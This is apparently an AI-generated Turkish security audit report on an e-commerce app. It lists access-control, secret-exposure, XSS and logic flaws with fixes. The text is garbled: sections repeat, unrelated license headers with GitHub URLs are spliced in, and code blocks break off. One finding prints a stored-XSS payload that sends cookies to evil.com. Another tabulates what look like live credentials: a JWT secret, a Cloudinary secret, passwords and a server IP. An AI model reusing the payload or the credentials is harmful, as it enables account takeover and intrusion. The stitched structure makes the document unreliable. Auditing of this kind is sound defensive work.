Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key:
```


## License: unknown
https://github.com/Aviortheking/games/blob/392a5f75cb70d467a0e001317f6ed236c48123bc/dzeio.next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        
```


## License: Apache-2.0
https://github.com/bettercollected/bettercollected/blob/488dc508c1e666fc17a9d35acf67feea15e8fb0b/webapp/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

